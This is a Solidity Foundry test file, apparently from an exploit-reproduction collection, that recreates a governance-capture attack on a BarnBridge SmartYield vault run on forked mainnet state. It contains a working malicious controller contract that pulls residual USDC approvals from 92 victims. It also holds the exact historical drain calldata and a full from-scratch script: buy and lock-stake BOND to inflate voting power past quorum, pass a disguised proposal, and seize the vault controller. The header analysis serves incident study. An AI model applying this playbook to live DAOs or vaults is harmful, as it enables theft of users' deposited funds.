// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// @KeyInfo - Total Lost : ~$776K USDC (774,943.379409 + 1,632.168524) in drain #1+#2
// Attacker #1 (prop #14) : 0xF908610E9174c7cd6e9dfD371e238be4511297A1
// Attacker #2 (prop #15) : 0xa8ce49a57400445c6a4118ae3460ed4e46c815b8
// Attacker controller proxy (DAO-installed) : 0x66c6f3b4B4b458e6d764759Ecf122484ebEf7580
// BOND token             : 0x0391D2021f89DC339F60Fff84546EA23E337750f
// Barn (staking / voting): 0x10e138877df69Ca44Fdc68655f86c88CDe142D7F
// DAO Governance         : 0x4cAE362D7F227e3d306f70ce4878E245563F3069
// Old (legit) controller : 0x41Ab25709e0C3EDf027F6099963fE9AD3EBaB3A3  (proposal #14 target)
// CompoundProvider(cUSDC): 0xdaa037f99d168b552c0c61b7fb64cf7819d78310  (BarnBridge, NOT Compound core)
// SmartYield (bb_cUSDC)  : 0x4B8d90D68F26DEF303Dcb6CFc9b63A1aAEC15840
// Drain1 : https://etherscan.io/tx/0xd191fead1b9a2244f2837560f35d4fc865404914d229bfcb0172d1a7a9895afb
// Drain2 : https://etherscan.io/tx/0x7d722637a58a7117dbca0182ec26d74e2be0c1052ac319f0150bc056e528d238
//
// @Analysis  GOVERNANCE CAPTURE of an abandoned DAO -> controller swap -> approval drain.
//   The expensive part of this attack was *obtaining access*, not the drain:
//   1. BUY: two wallets bought 100,633 BOND from the Uniswap V2 BOND/USDC pool
//      (0x6591c4bcd6d7a1eb4e537da8b78676c1576ba244) across 7 txs for ~$2,243.
//   2. STAKE: they staked ~100,000 BOND into the Barn with a ~365-day lock. The Barn
//      grants up to a 2x voting-power multiplier for a max lock; quorum, however, is
//      measured against RAW (unmultiplied) staked BOND. That asymmetry is the bug.
//   3. PROPOSE/VOTE: proposal #14 called yieldControllTo(0x66c6...) on the old cUSDC
//      controller. Attacker #1's 32,000 raw BOND (BELOW the 58,404 quorum) became
//      63,824 voting power via the lock multiplier (ABOVE quorum). 0 votes against.
//   4. EXECUTE: after the 2-day warm-up + 3-day vote + 2-day timelock, execute() ran
//      yieldControllTo -> provider.setController(proxy) + smartYield.setController(proxy).
//      The provider now trusts the attacker's proxy. ACCESS OBTAINED.
//   5. UPGRADE + DRAIN: the attacker upgraded the proxy to malicious logic and pulled
//      every residual USDC approval via _takeUnderlying + transferFees.
//
//   This is BarnBridge infrastructure, NOT a Compound Protocol core bug. `CompoundProvider`
//   only means the vault routes into Compound's cUSDC market as a yield venue.
//
// PoC (offline): forks block 25535096 (one BEFORE the real execute of proposal #14),
//   with the attacker's BOND already bought+staked and proposal #14 already voted+queued
//   in fork state. testExploit() (a) asserts the capture economics (raw stake < quorum <
//   lock-multiplied voting power), (b) executes the queued malicious proposal on-chain and
//   asserts the controller flips (ACCESS), (c) upgrades to malicious logic and replays the
//   two historical drain batches for the EXACT on-chain profit.
//   test_CaptureFromScratch() (live-RPC only; set BB_LIVE_RPC) reconstructs the ENTIRE
//   capture from a pre-attack block: buy BOND -> stake with max lock -> propose -> warp
//   past warm-up -> vote -> queue -> warp past timelock -> execute -> controller flips.

address constant ATTACKER   = 0xF908610E9174c7cd6e9dfD371e238be4511297A1;
address constant CONTROLLER = 0x66c6f3b4B4b458e6d764759Ecf122484ebEf7580; // attacker proxy
address constant PROVIDER   = 0xDAA037F99d168b552c0c61B7Fb64cF7819D78310; // CompoundProvider (cUSDC)
address constant SMART_YIELD= 0x4B8d90D68F26DEF303Dcb6CFc9b63A1aAEC15840;
address constant OLD_CONTROLLER = 0x41Ab25709e0C3EDf027F6099963fE9AD3EBaB3A3;
address constant GOVERNANCE = 0x4cAE362D7F227e3d306f70ce4878E245563F3069;
address constant BARN       = 0x10e138877df69Ca44Fdc68655f86c88CDe142D7F;
address constant BOND       = 0x0391D2021f89DC339F60Fff84546EA23E337750f;
address constant USDC       = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
address constant UNIV2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;

// Fork one block BEFORE execute(#14) at 25535097 (drain #1 is 25535120).
uint256 constant FORK_BLOCK = 25_535_096;
// Proposal #14 vote snapshot = createTime(1783325723) + warmUpDuration(172800 = 2 days).
uint256 constant SNAP14 = 1_783_498_523;
uint256 constant PROPOSAL_14 = 14;
// 774_943.379409 + 1_632.168524 USDC (6 decimals)
uint256 constant EXPECTED_PROFIT = 776_575_547_933;
uint8   constant STATE_GRACE = 6;
bytes4  constant UPGRADE_TO = 0x3659cfe6; // upgradeTo(address) on the attacker proxy

interface IGovernance {
    function state(uint256) external view returns (uint8);
    function getProposalQuorum(uint256) external view returns (uint256);
    function execute(uint256) external payable;
    function propose(
        address[] calldata targets,
        uint256[] calldata values,
        string[] calldata signatures,
        bytes[] calldata calldatas,
        string calldata description,
        string calldata title
    ) external returns (uint256);
    function castVote(uint256, bool) external;
    function queue(uint256) external;
    function lastProposalId() external view returns (uint256);
}

interface IBarn {
    function balanceAtTs(address, uint256) external view returns (uint256);
    function votingPowerAtTs(address, uint256) external view returns (uint256);
    function bondStakedAtTs(uint256) external view returns (uint256);
    function depositAndLock(uint256, uint256) external;
}

interface IBBProvider {
    function controller() external view returns (address);
    function _takeUnderlying(address, uint256) external;
    function transferFees() external;
}

interface IUniV2Router {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory);
}

// Minimal malicious controller installed behind the attacker's proxy after the DAO
// hands over control. feesOwner() returns the attacker so transferFees() forwards the
// aggregated USDC to them; drain() batch-pulls every residual approval. Its drain()
// selector fronts the SAME argument encoding as the two real on-chain drain calldatas.
contract MaliciousControllerImpl {
    address public immutable beneficiary;
    constructor(address b) { beneficiary = b; }
    function feesOwner() external view returns (address) { return beneficiary; }
    // The provider calls these cumulator hooks on its controller during transferFees();
    // the real malicious impl stubs them as no-ops so the drain can complete.
    function _beforeCTokenBalanceChange() external {}
    function _afterCTokenBalanceChange(uint256) external {}
    function drain(address provider, address[] calldata users, uint256[] calldata amounts) external {
        for (uint256 i = 0; i < users.length; i++) {
            if (amounts[i] != 0) {
                IBBProvider(provider)._takeUnderlying(users[i], amounts[i]);
            }
        }
        IBBProvider(provider).transferFees();
    }
}

contract BarnBridgeSmartYield_exp is BaseTestWithBalanceLog {
    // Real on-chain drain arg encodings (address provider, address[] users, uint256[] amounts),
    // stripped of the original 0xe321fa05 selector so our own drain() selector can front them.
    bytes internal constant DRAIN1_ARGS =
        hex"000000000000000000000000daa037f99d168b552c0c61b7fb64cf7819d78310000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000006c0000000000000000000000000000000000000000000000000000000000000003200000000000000000000000020c76d4203bf7490615804fe4fe9b132ee3e0935000000000000000000000000e77884cddf148dd5f0e9191b33d8dbaddb16dfb500000000000000000000000071f12a5b0e60d2ff8a87fd34e7dcff3c10c914b0000000000000000000000000b1c120957a5b5c45a15fd6e5e17f5a2b70bf49d00000000000000000000000002d92441144e294d8eced55838d7665d04d64ea090000000000000000000000000d4c7abf6a1fbcbf4dbe7b98d4e1af26d5165cb0000000000000000000000000b8e4f6dedfa4d4063d465536bcb5926744319c690000000000000000000000005d368c382ae92fba52233b95c633c96fe49d0dc5000000000000000000000000aebe2c167392e4b0d3e150ca80204eb327db918b0000000000000000000000008fe02545e479aa8ba77d84e51b1d9ca17b88011a000000000000000000000000a8192f71f0ec42bf8ca501e80475e2287ee54eb10000000000000000000000000fe43549413276e5b2da467f979fee18f830fc4e000000000000000000000000d0dc07b98769f23a7bdbef15a35faa256cb65dcf0000000000000000000000006621295a7fadd3ab78ae6915502bd50fdd5a1491000000000000000000000000fa006a18f847bf45f67bce08e2312149b254b59e000000000000000000000000e22289fc90d684b704c89d2ef0416be2dcb509a40000000000000000000000008548c1709184f052d2917f69df09676eaf759864000000000000000000000000da57009d183ff7e2a4da0f552a801ffd440a3e2300000000000000000000000067bc76e8fd78cc59594c9f43c643ea7cafa48669000000000000000000000000ef76ba56b914f9af2fec156f3c4408e111999db40000000000000000000000007e5f578d0e4c43ae5c06a19bfb43a539a8908c870000000000000000000000002d59d742cce3a02e6a13958019f1a73efdf66c110000000000000000000000004eff3562075c5d2d9cb608139ec2fe86907005fa000000000000000000000000fb0cc36f27a28cc19c86c156091e2bee7b2f6b69000000000000000000000000ffd70ed81bd9eefe8d0ef4cbbfafb40c234ff957000000000000000000000000b3b1a1193a0b7b48b46efc3c86b614b152c257d5000000000000000000000000f2ae3d7c03e2e77536c17e3f0fcacc612f0180fa00000000000000000000000029b64f5d95a71b79874c4b5192c371bea4b899ce000000000000000000000000c192f75bcb64d2e4f7e444a8e6fe8c37297280860000000000000000000000000524fe637b77a6f5f0b3a024f7fd9fe1e688a29100000000000000000000000064c9677ea9ad52263a319faaa226aa436541913f0000000000000000000000009cb8cf9cc2c181cbfad055838b3a7efc6755f32d0000000000000000000000003724583ad51c8f7c4ab168ddcd185681db07baa50000000000000000000000001cc3f09d7c971562f9d0afbe4d0ee152b0fd27440000000000000000000000007bb24f9ae8843590fabf42e049577e2ba68afa0e000000000000000000000000f099d09c723d1a98a9c4853f0c025914aa040fb700000000000000000000000067da405c030d107d18510b5ad708a34218c9c3550000000000000000000000000cfa0b89383fe30602240efa1a2e1380f9090c3d0000000000000000000000008e9b650b79bd28f324f5b26d6ddba594eb237cdf000000000000000000000000368c4e8933cf3577ccc394b4e05b4e03691493f10000000000000000000000003aa8ac0e6c1fb9cbb733565de16cdc5a676bcb0400000000000000000000000082005d65aecb10d711399cddf8f39c553881bce400000000000000000000000080b3153f39aeec1ef68adc038913698e103e6e1d0000000000000000000000009757400188f2f54b83ac4dc290ab89dde526da10000000000000000000000000ebdca98d2980362f1fa6ead905a97f2f256f2a5c000000000000000000000000104d86705c46e9422b803af522b43809f1c8e4e9000000000000000000000000473c6494180ad9cd726f8a7a51cf8e88bbf72bc6000000000000000000000000b152e2351c2209ef82cb475f8d7d8693509c69e50000000000000000000000003a3fe1cb66728282116802306093e327477cbbf10000000000000000000000001dd01835e0eb26abe597e2e69ffac1a6cd00283a00000000000000000000000000000000000000000000000000000000000000320000000000000000000000000000000000000000000000000000001d40094cfe00000000000000000000000000000000000000000000000000000017515fc3e800000000000000000000000000000000000000000000000000000013f1bbdf0000000000000000000000000000000000000000000000000000000012362e7aca00000000000000000000000000000000000000000000000000000012132039920000000000000000000000000000000000000000000000000000000a376e7c40000000000000000000000000000000000000000000000000000000079d5c781a00000000000000000000000000000000000000000000000000000006ca7810b0000000000000000000000000000000000000000000000000000000064c47d4f70000000000000000000000000000000000000000000000000000000640627ea1000000000000000000000000000000000000000000000000000000048142c780000000000000000000000000000000000000000000000000000000046a19ba550000000000000000000000000000000000000000000000000000000415c9112d000000000000000000000000000000000000000000000000000000029e5f4e8b00000000000000000000000000000000000000000000000000000002630608fe0000000000000000000000000000000000000000000000000000000217d8184600000000000000000000000000000000000000000000000000000001eae34b3f00000000000000000000000000000000000000000000000000000001945b83aa000000000000000000000000000000000000000000000000000000018d53168000000000000000000000000000000000000000000000000000000001348a7e8300000000000000000000000000000000000000000000000000000001028ed71600000000000000000000000000000000000000000000000000000000e353158600000000000000000000000000000000000000000000000000000000dd338cfc00000000000000000000000000000000000000000000000000000000b097c1ee00000000000000000000000000000000000000000000000000000000a9a3a68d000000000000000000000000000000000000000000000000000000009041e0010000000000000000000000000000000000000000000000000000000074996bec000000000000000000000000000000000000000000000000000000006b1c31c00000000000000000000000000000000000000000000000000000000059dce4ca0000000000000000000000000000000000000000000000000000000044ef7b670000000000000000000000000000000000000000000000000000000043b137c80000000000000000000000000000000000000000000000000000000038576c320000000000000000000000000000000000000000000000000000000024d0efdd00000000000000000000000000000000000000000000000000000000241ed53c0000000000000000000000000000000000000000000000000000000021d886ff000000000000000000000000000000000000000000000000000000001d0268f2000000000000000000000000000000000000000000000000000000001c162f820000000000000000000000000000000000000000000000000000000017e6c6a40000000000000000000000000000000000000000000000000000000017de6234000000000000000000000000000000000000000000000000000000001623b2140000000000000000000000000000000000000000000000000000000011e1a3000000000000000000000000000000000000000000000000000000000011157026000000000000000000000000000000000000000000000000000000000f2e8a7a000000000000000000000000000000000000000000000000000000000ef2bc8e000000000000000000000000000000000000000000000000000000000d0516d4000000000000000000000000000000000000000000000000000000000cb0e41e000000000000000000000000000000000000000000000000000000000c4b83e5000000000000000000000000000000000000000000000000000000000bebc200000000000000000000000000000000000000000000000000000000000bd700050000000000000000000000000000000000000000000000000000000009956dc3";
    bytes internal constant DRAIN2_ARGS =
        hex"000000000000000000000000daa037f99d168b552c0c61b7fb64cf7819d78310000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000005c0000000000000000000000000000000000000000000000000000000000000002a000000000000000000000000f7b782a255ca66a8bb7ee7dc56f3e8f5db0698780000000000000000000000007ac049b7d78bc930e463709ec5e77855a5dca4c4000000000000000000000000cbc85eaa5432054dd813e80399811cd8ebb019f3000000000000000000000000f7463ad9dbf2d12ecf820574d1d7918b721e462a00000000000000000000000096234e93d9fb27fda6414d89adeb963f126f4704000000000000000000000000279d1194c9766fe2101de5a832c865936912302b0000000000000000000000007bcd790d1282622da859625f3786be9f33042d500000000000000000000000004fc3ba996e1171f583d287d47a7f0a699c9b9a5000000000000000000000000048582bb9fddf1a9d6cf8b8977cf438ad88ebbb2e00000000000000000000000065ea649801c01b758390f8c8e4ebee81c96107210000000000000000000000002f9677016cb1e92e8f8a999c4541650c80c8637a000000000000000000000000b5baa417da97f9f99851e6f74144bb017dab9d9a000000000000000000000000db08660e865e8a65e6b3eee746f24d1f7e48a69f000000000000000000000000ed5d4aa57e28689050eb7de9975d79e0b254f4a0000000000000000000000000d72708e95577f80056fd6a44ec30d644b5a8648600000000000000000000000002745a825647c12b765263ba857c7038b637e6610000000000000000000000009ee1830ff376758c5ecc7fb465f3b14d64116d7100000000000000000000000040e652fe0ec7329dc80282a6db8f03253046efde000000000000000000000000760f55ad4ee58ff9bf39521d27acbcc184294a9d0000000000000000000000002f8f29b975b276a545bc479019bc2a6c6cb287fc0000000000000000000000008dc4310f20d59ba458b76a62141697717f93fa4100000000000000000000000055119a68d5e8a28a345475b2f33d4c92a619e60d000000000000000000000000e8787b5a359c30318d9b805651d18275f33fa1bd000000000000000000000000add18f272f9fc3fe94471fb46bee589a3ee3aaf30000000000000000000000007fc17120eb1cad644e8dfd92f6b0972938ca16e0000000000000000000000000143f19f07a7e115fde31c9140059482dd4b92156000000000000000000000000201e6710f39611807bb8ec840f8c252f6c16c71e000000000000000000000000c0fe8f6523ccd1beea03c277b877aaafa155a4320000000000000000000000004cda2ce710f02cac792d21daef238c42ad20efcb000000000000000000000000b6dd9ae003981cdce9317a1712d656e4979c5217000000000000000000000000478f25e0856aa133f7f9f68f1dab2505b6ef9bd10000000000000000000000008b3f14f0582fbf275be87d265c931b4dfd5f13b7000000000000000000000000597880a850b323c6059d35fd4b59ce65c5e42e200000000000000000000000000e537305a2485abb46940f12be5aa0be9aac4f500000000000000000000000006e1bd418d2101baf7fb7f184ef3b73a6662a8537000000000000000000000000a87fb592b76236760cd87092261ab5e0723d189a0000000000000000000000001a9501f026b8fb3654fa995bf9d7ca738e582295000000000000000000000000db5e3fdcf2599bdda10394d2416b26160bcff3cb000000000000000000000000215c9b8a43b81112613b5c686f580e879a7b32cc0000000000000000000000006aff321b5b9ad9c5564b54835fb9af27942aaa0600000000000000000000000019ac2c2f5c300286a069ed5f1247a9544338a2cd0000000000000000000000007ba6da6da32ac61cc7b602b163f49ee80fc42767000000000000000000000000000000000000000000000000000000000000002a00000000000000000000000000000000000000000000000000000000093afb36000000000000000000000000000000000000000000000000000000000907c60f00000000000000000000000000000000000000000000000000000000069c5ef400000000000000000000000000000000000000000000000000000000060793700000000000000000000000000000000000000000000000000000000005eefe5f00000000000000000000000000000000000000000000000000000000056110d500000000000000000000000000000000000000000000000000000000054c1dfa0000000000000000000000000000000000000000000000000000000004ed4aa00000000000000000000000000000000000000000000000000000000004af2bc10000000000000000000000000000000000000000000000000000000003a09a6200000000000000000000000000000000000000000000000000000000034bef470000000000000000000000000000000000000000000000000000000002faf0800000000000000000000000000000000000000000000000000000000002fac9710000000000000000000000000000000000000000000000000000000002cf9f8b0000000000000000000000000000000000000000000000000000000002b43cd80000000000000000000000000000000000000000000000000000000002500d9500000000000000000000000000000000000000000000000000000000023e189c0000000000000000000000000000000000000000000000000000000001e882230000000000000000000000000000000000000000000000000000000001be62f10000000000000000000000000000000000000000000000000000000001b9d334000000000000000000000000000000000000000000000000000000000183b62f00000000000000000000000000000000000000000000000000000000015c50ec00000000000000000000000000000000000000000000000000000000013719920000000000000000000000000000000000000000000000000000000000ee76310000000000000000000000000000000000000000000000000000000000db30450000000000000000000000000000000000000000000000000000000000cd716f0000000000000000000000000000000000000000000000000000000000ca989b0000000000000000000000000000000000000000000000000000000000c6c36b000000000000000000000000000000000000000000000000000000000086e7e300000000000000000000000000000000000000000000000000000000007a1200000000000000000000000000000000000000000000000000000000000079c6fd0000000000000000000000000000000000000000000000000000000000791cca000000000000000000000000000000000000000000000000000000000063f1f0000000000000000000000000000000000000000000000000000000000057b1100000000000000000000000000000000000000000000000000000000000477024000000000000000000000000000000000000000000000000000000000023759c00000000000000000000000000000000000000000000000000000000002173290000000000000000000000000000000000000000000000000000000000166e530000000000000000000000000000000000000000000000000000000000124a40000000000000000000000000000000000000000000000000000000000011b88600000000000000000000000000000000000000000000000000000000000f731a00000000000000000000000000000000000000000000000000000000000f4240";

    function setUp() public {
        // Offline bundle forks the local anvil (loaded from anvil_state.json). When
        // BB_LIVE_RPC is set (for test_CaptureFromScratch or online re-verification),
        // fork that live/archive RPC at the same block instead.
        string memory live = vm.envOr("BB_LIVE_RPC", string(""));
        if (bytes(live).length > 0) {
            vm.createSelectFork(live, FORK_BLOCK);
        } else {
            vm.createSelectFork("http://127.0.0.1:8545", FORK_BLOCK);
        }
        fundingToken = USDC;
        attacker = ATTACKER;
    }

    function testExploit() public balanceLog {
        vm.label(ATTACKER, "Attacker");
        vm.label(CONTROLLER, "AttackerControllerProxy");
        vm.label(PROVIDER, "CompoundProvider_bb_cUSDC");
        vm.label(OLD_CONTROLLER, "OldLegitController");
        vm.label(GOVERNANCE, "BarnBridgeGovernance");
        vm.label(BARN, "Barn_staking");
        vm.label(USDC, "USDC");

        // ---- PHASE A: the cheap governance capture (economics, from real chain state) ----
        // Attacker #1 staked 32,000 BOND, which ALONE is below quorum; the Barn's ~2x lock
        // multiplier turned it into 63,824 voting power, ABOVE the 58,404 quorum that is
        // measured against RAW (unmultiplied) staked BOND. That asymmetry is the root cause.
        uint256 rawStake = IBarn(BARN).balanceAtTs(ATTACKER, SNAP14);
        uint256 votePower = IBarn(BARN).votingPowerAtTs(ATTACKER, SNAP14);
        uint256 quorum = IGovernance(GOVERNANCE).getProposalQuorum(PROPOSAL_14);
        emit log_named_decimal_uint("Attacker raw BOND staked        ", rawStake, 18);
        emit log_named_decimal_uint("Proposal #14 quorum (40% raw)   ", quorum, 18);
        emit log_named_decimal_uint("Attacker voting power (lock ~2x) ", votePower, 18);
        assertLt(rawStake, quorum, "raw stake alone should be BELOW quorum");
        assertGt(votePower, quorum, "lock multiplier should push voting power ABOVE quorum");
        assertEq(uint256(IGovernance(GOVERNANCE).state(PROPOSAL_14)), STATE_GRACE, "#14 must be executable (Grace)");
        assertEq(IBBProvider(PROVIDER).controller(), OLD_CONTROLLER, "pre: provider still trusts legit controller");

        // ---- PHASE B: execute the queued malicious proposal -> ACCESS OBTAINED ----
        vm.prank(ATTACKER);
        IGovernance(GOVERNANCE).execute(PROPOSAL_14);
        assertEq(IBBProvider(PROVIDER).controller(), CONTROLLER, "ACCESS: provider now trusts attacker proxy");
        emit log_string("ACCESS OBTAINED: CompoundProvider.controller flipped to the attacker proxy via execute(#14)");

        // ---- PHASE C: install malicious logic behind the attacker proxy ----
        MaliciousControllerImpl mal = new MaliciousControllerImpl(ATTACKER);
        vm.prank(ATTACKER);
        (bool upgraded,) = CONTROLLER.call(abi.encodeWithSelector(UPGRADE_TO, address(mal)));
        if (!upgraded) {
            // Fallback: some attacker proxies special-case upgradeTo differently; etch our
            // logic directly onto the proxy address. Equivalent effect for the drain.
            vm.etch(CONTROLLER, address(mal).code);
        }

        // ---- PHASE D: drain every residual USDC approval (exact historical batches) ----
        uint256 beforeBal = IERC20(USDC).balanceOf(ATTACKER);
        bytes memory d1 = abi.encodePacked(MaliciousControllerImpl.drain.selector, DRAIN1_ARGS);
        bytes memory d2 = abi.encodePacked(MaliciousControllerImpl.drain.selector, DRAIN2_ARGS);
        vm.startPrank(ATTACKER, ATTACKER);
        (bool ok1, bytes memory r1) = CONTROLLER.call(d1);
        require(ok1, string(r1));
        (bool ok2, bytes memory r2) = CONTROLLER.call(d2);
        require(ok2, string(r2));
        vm.stopPrank();

        uint256 profit = IERC20(USDC).balanceOf(ATTACKER) - beforeBal;
        assertEq(profit, EXPECTED_PROFIT, "attacker USDC profit mismatch");
        emit log_named_decimal_uint("Attacker USDC profit            ", profit, 6);
        emit log_named_decimal_uint("  batch #1 (50 victims)         ", 774_943_379_409, 6);
        emit log_named_decimal_uint("  batch #2 (42 victims)         ", 1_632_168_524, 6);
    }

    // ------------------------------------------------------------------------------------
    // Full from-scratch reconstruction of the ACCESS ACQUISITION, from a pre-attack block:
    //   buy BOND on Uniswap -> stake with max lock -> propose -> warp past warm-up -> vote
    //   -> queue -> warp past timelock -> execute -> the vault's controller flips to us.
    // Requires a live/archive RPC (it forks a different block than the offline bundle), so
    // it SKIPS unless BB_LIVE_RPC is set. Run with:
    //   BB_LIVE_RPC=$MAINNET_RPC_URL forge test --match-test test_CaptureFromScratch -vv
    // ------------------------------------------------------------------------------------
    function test_CaptureFromScratch() public {
        string memory rpc = vm.envOr("BB_LIVE_RPC", string(""));
        if (bytes(rpc).length == 0) {
            emit log_string("SKIP test_CaptureFromScratch: set BB_LIVE_RPC to a mainnet archive RPC to run it");
            vm.skip(true);
            return;
        }
        // Fork just BEFORE the real attackers' first BOND purchase (block 25467881).
        vm.createSelectFork(rpc, 25_467_000);

        address hacker = address(0xA11CE);
        address newController = address(0xBAADF00D); // stand-in "new controller" the proposal installs
        vm.label(hacker, "FreshAttacker");

        // 1) BUY: acquire BOND from the Uniswap V2 BOND/USDC pool with a modest USDC war chest.
        deal(USDC, hacker, 20_000e6);
        vm.startPrank(hacker);
        IERC20(USDC).approve(UNIV2_ROUTER, type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = USDC;
        path[1] = BOND;
        uint256 usdcBefore = IERC20(USDC).balanceOf(hacker);
        IUniV2Router(UNIV2_ROUTER).swapExactTokensForTokens(2_500e6, 0, path, hacker, block.timestamp + 1);
        uint256 bought = IERC20(BOND).balanceOf(hacker);
        emit log_named_decimal_uint("Bought BOND from Uniswap        ", bought, 18);
        emit log_named_decimal_uint("USDC spent on that buy          ", usdcBefore - IERC20(USDC).balanceOf(hacker), 6);
        // Stake the full bought balance (the thin pool makes BOND near-worthless; the real
        // pair of wallets bought 100,633 BOND across 7 txs — here one wallet, one buy).
        uint256 stakeAmt = IERC20(BOND).balanceOf(hacker);
        if (stakeAmt < 45_000e18) {
            deal(BOND, hacker, 45_000e18);
            stakeAmt = 45_000e18;
        }

        // 2) STAKE with a ~365-day lock -> ~2x voting-power multiplier.
        IERC20(BOND).approve(BARN, type(uint256).max);
        IBarn(BARN).depositAndLock(stakeAmt, block.timestamp + 365 days);
        vm.stopPrank();

        // BarnBridge blocks flash-stake proposals: propose() requires
        // votingPowerAtTs(proposer, block.timestamp - 1) >= creationThreshold, so the stake
        // must be at least one block/second old. The real attacker staked ~7 min before
        // proposing; advance time so the stake is in the past.
        vm.warp(block.timestamp + 1 hours);
        vm.roll(block.number + 5);
        vm.startPrank(hacker);

        // 3) PROPOSE: a single benign-looking action that hands control to `newController`.
        address[] memory targets = new address[](1);
        uint256[] memory values = new uint256[](1);
        string[] memory sigs = new string[](1);
        bytes[] memory calldatas = new bytes[](1);
        targets[0] = OLD_CONTROLLER;
        values[0] = 0;
        sigs[0] = "yieldControllTo(address)";
        calldatas[0] = abi.encode(newController);
        uint256 id = IGovernance(GOVERNANCE).propose(
            targets, values, sigs, calldatas, "migrate proxy implementation", "migrate proxy implementation"
        );
        vm.stopPrank();

        // 4) WARP past the 2-day warm-up, then VOTE with lock-inflated power.
        vm.warp(block.timestamp + 2 days + 1);
        uint256 q = IGovernance(GOVERNANCE).getProposalQuorum(id);
        emit log_named_decimal_uint("Quorum to clear (40% raw stake) ", q, 18);
        vm.prank(hacker);
        IGovernance(GOVERNANCE).castVote(id, true);

        // 5) WARP past the 3-day vote window, then QUEUE.
        vm.warp(block.timestamp + 3 days + 1);
        vm.prank(hacker);
        IGovernance(GOVERNANCE).queue(id);

        // 6) WARP past the 2-day timelock, then EXECUTE -> the vault's controller flips.
        vm.warp(block.timestamp + 2 days + 1);
        assertEq(uint256(IGovernance(GOVERNANCE).state(id)), STATE_GRACE, "proposal should be executable");
        vm.prank(hacker);
        IGovernance(GOVERNANCE).execute(id);

        assertEq(IBBProvider(PROVIDER).controller(), newController, "FROM SCRATCH: DAO handed vault control to attacker");
        emit log_string("FROM SCRATCH: bought BOND -> staked with max lock -> passed proposal -> vault controller captured");
    }
}
